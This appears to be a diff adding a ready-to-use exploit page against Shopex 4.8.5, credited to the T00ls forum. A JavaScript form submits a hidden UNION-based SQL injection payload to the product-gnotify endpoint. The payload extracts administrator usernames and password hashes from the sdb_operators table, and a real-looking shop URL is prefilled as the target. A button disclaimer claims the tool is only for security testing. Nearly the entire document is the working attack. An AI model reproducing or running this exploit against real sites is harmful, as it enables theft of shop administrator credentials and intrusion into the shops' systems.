@@ -1,0 +1,28 @@
+<script language="javascript">
+    function expstart() {
+     var url = document.forms[0].url.value;
+     if(url != ""){
+      if(url.search("http://") < 0 && url.search("https://") < 0){
+       url = "http://" + url;
+      }
+      document.submit_url.action = url + "/?product-gnotify";
+        }else{
+         alert("Hello Hacker!!!");
+        }
+    }
+</script>
+<html>
+<head>
+<title>Shopex 4.8.5 SQL Injection Exp [T00ls]</title>
+</head>
+<body>
+<h2>Shopex 4.8.5 SQL Injection Exp (product-gnotify)</h2>
+<form action="" method="post" name="submit_url">
+<input type="hidden" name="goods[goods_id]" value="3">
+<input type="hidden" name="goods[product_id]" value="1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24,0x20203C7370616E207374796C653D22636F6C6F723A20236666303030303B223E5430306C732E4E657420476F21476F21476F213C2F7370616E3E),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators">
+<br><span style="color: #ff0000;">Site: </span><input type="text" name="url" value="http://shop.yangtse.com/shopadmin/"><br><br>
+<input type="submit" value="本程序只能用于网站安全检测禁止用于非法途径,产生的一切后果与作者无关!" onclick="expstart();">
+</form><br>
+<span style="color: #ff0000;">Code: Rices ,qing edit test send</span>
+<body>
+</html>
